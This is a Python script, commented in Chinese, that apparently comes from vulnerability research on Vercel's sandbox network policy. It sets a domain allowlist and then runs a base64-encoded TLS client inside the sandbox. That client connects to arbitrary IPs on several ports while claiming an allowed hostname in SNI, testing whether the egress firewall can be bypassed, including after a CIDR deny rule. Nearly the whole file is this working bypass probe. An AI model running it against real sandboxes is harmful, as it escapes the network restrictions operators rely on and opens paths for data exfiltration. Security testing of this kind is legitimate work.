# -*- coding: utf-8 -*-
"""SNI 欺骗深度验证: 证书归属 + 完整响应 + 端口变体 + deny 交互
1) 证书 subject/issuer: 判定防火墙代理 (Vercel 签发) vs 直通 (目标真实证书)
2) 完整响应 body: httpbin url 字段回显
3) 非 443 端口变体: 8443 / 4443 / 80
4) deny 3.234.68.0/24 后 SNI 欺骗 (deny 与代理链交互)
"""
import base64, json, sys, time
sys.path.insert(0, r'F:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, cmd, TEAM, PROJ

c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s' % (TEAM, PROJ))
d = json.loads(r)
sid = d['sandbox']['currentSessionId']
print('npol1 sid:', sid, 'status:', d['sandbox']['status'], flush=True)
if d['sandbox'].get('status') != 'running':
    c, r = api('GET', '/v2/sandboxes/npol1?teamId=%s&projectId=%s&resume=true' % (TEAM, PROJ))
    d = json.loads(r)
    sid = d['sandbox']['currentSessionId']
    print('resumed sid:', sid, flush=True)
    time.sleep(5)

def parse_data(r):
    out = ''
    for line in r.splitlines():
        if '"data"' in line:
            try:
                out += json.loads(line).get('data', '')
            except Exception:
                pass
    return out

# 恢复 custom + allow httpbin.org
api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM),
    {"mode": "custom", "allowedDomains": ["httpbin.org"]})
time.sleep(3)

TLS_CODE = '''import socket, ssl, sys
ip, sni, port, path = sys.argv[1], sys.argv[2], int(sys.argv[3]), sys.argv[4]
try:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    s = ctx.wrap_socket(socket.create_connection((ip, port), timeout=6), server_hostname=sni)
    print('TLSVER', s.version())
    s.sendall(('GET %s HTTP/1.1\\r\\nHost: %s\\r\\nConnection: close\\r\\n\\r\\n' % (path, sni)).encode())
    d = b''
    while True:
        try:
            chunk = s.recv(4096)
            if not chunk: break
            d += chunk
        except Exception:
            break
    print('RESP:', repr(d[:500]))
except Exception as e:
    print('ERR', type(e).__name__, str(e)[:80])
'''

def probe(ip, sni, port, path, tag):
    b64 = base64.b64encode(TLS_CODE.encode()).decode()
    sc = 'echo %s | base64 -d | python3 - %s %s %d %s' % (b64, ip, sni, port, path)
    c, r = cmd(sid, 'sh', ['-c', sc], timeout_ms=45000)
    out = parse_data(r).strip()
    print('[%s] %s' % (tag, out[:400]), flush=True)
    return out

# 1) 证书归属 + 完整响应
probe('3.234.68.252', 'httpbin.org', 443, '/anything', 'C1-baseline-cert')
probe('1.1.1.1',      'httpbin.org', 443, '/anything', 'C2-spoof1111-cert')
probe('172.31.0.2',   'httpbin.org', 443, '/anything', 'C3-vpc-cert')

# 2) 端口变体
probe('1.1.1.1',      'httpbin.org', 8443, '/anything', 'C4-port8443')
probe('1.1.1.1',      'httpbin.org', 4443, '/anything', 'C5-port4443')
probe('8.8.8.8',      'httpbin.org', 80,   '/anything', 'C6-port80')

# 3) deny 公网 httpbin 网段后 SNI 欺骗
api('POST', '/v2/sandboxes/sessions/%s/network-policy?teamId=%s' % (sid, TEAM),
    {"mode": "custom", "allowedDomains": ["httpbin.org"], "deniedCIDRs": ["3.234.68.0/24"]})
time.sleep(3)
probe('3.234.68.252', 'httpbin.org', 443, '/anything', 'C7-deny-baseline')
probe('1.1.1.1',      'httpbin.org', 443, '/anything', 'C8-deny-spoof')

print('=== SNI2 DONE ===', flush=True)
